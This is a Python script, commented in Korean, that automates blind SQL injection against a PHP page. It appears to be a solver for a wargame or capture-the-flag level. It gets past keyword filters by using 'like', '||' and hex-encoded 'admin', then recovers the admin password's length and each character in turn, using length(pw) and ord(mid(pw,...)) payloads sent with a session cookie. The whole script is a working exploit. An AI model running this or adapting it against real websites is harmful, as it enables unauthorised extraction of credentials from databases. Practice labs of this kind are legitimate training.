import requests
#url 입력
BASE_URL = ""
#PHPSESSID
MY_COOKIE = ""

class CustomSQLInjector:
    def __init__(self, base_url, cookie):
        self.base_url = base_url
        self.headers = {'Cookie': f'PHPSESSID={cookie}'}
        self.success_msg = "Hello admin"

    def check_filter(self, text, full_url):
        #필터링 감지 시 차단된 전체 URL 출력
        if "config" not in text:
            if "No Hack" in text or "HeHe" in text:
                print(f"\n[!] 필터링 감지됨: {full_url}")
                return True
        return False

    def run(self, payload_template, mode="length", length=0):
        if mode == "length":
            print("길이 구하기 시작")
            for i in range(1, 40):
                # 쿼리내에 {val}에 {i} 대입
                query = payload_template.format(val=i)
                full_url = self.base_url + query
                res = requests.get(full_url, headers=self.headers)
                
                if self.check_filter(res.text, full_url): return None
                if self.success_msg in res.text:
                    print(f"[+] 비번 길이: {i}")
                    return i
            return None

        elif mode == "password":
            print("[*] 비번 캐기 시작")
            password = ""
            for i in range(1, length + 1):
                found = False
                for char_code in range(32, 127):
                    query = payload_template.format(idx=i, val=char_code)
                    full_url = self.base_url + query
                    res = requests.get(full_url, headers=self.headers)
                    
                    if self.check_filter(res.text, full_url): return password
                    if self.success_msg in res.text:
                        password += chr(char_code)
                        print(f"[+] {i}번째: {chr(char_code)} (비번: {password})")
                        found = True
                        break
                if not found: break
            return password

if __name__ == "__main__":
    injector = CustomSQLInjector(BASE_URL, MY_COOKIE)

    # 비번 길이 구하기 쿼리 (preg_match() 알아서 바꾸기)
    #LEN_PAYLOAD = "?no=1 || id LIKE 0x61646d696e %26%26 length(pw) LIKE {val} %23"
    LEN_PAYLOAD = "?no=1 || id like 0x61646d696e %26%26 length(pw) like {val} %23"

    # BlindSQLi 쿼리(preg_match()보고 알아서 바꾸기)
    #CHAR_PAYLOAD = "?no=1 || id LIKE 0x61646d696e %26%26 ord(mid(pw,{idx},1)) LIKE {val} %23"
    CHAR_PAYLOAD = "?no=1 || id LIKE 0x61646d696e %26%26 ord(mid(pw,{idx},1)) LIKE {val} %23"
  
    pw_len = injector.run(LEN_PAYLOAD, mode="length")
    if pw_len:
        final_pw = injector.run(CHAR_PAYLOAD, mode="password", length=pw_len)
        print(f"\n 비번: {final_pw}")
